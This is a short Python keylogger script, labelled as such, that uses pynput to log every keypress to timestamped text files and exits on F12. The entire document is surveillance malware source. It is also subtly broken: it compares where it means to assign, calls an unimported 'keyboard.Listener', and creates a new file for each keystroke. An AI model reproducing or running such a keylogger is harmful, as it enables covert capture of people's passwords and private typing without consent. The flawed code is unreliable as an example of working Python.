#file keylloger

from pynput.keyboard import Listener
import datetime
def out(key):
	key == str(key)
	if key =="Key.f12":
		raise SystemExit(0)
	if key =="Key.enter":
		key ="\n"
	a =str(datetime.datetime.now()) + str(".txt")
	with open( a , "a") as file:
		file.write(key)
	
with keyboard.Listener(on_press=out) as listener:
	listener.join()
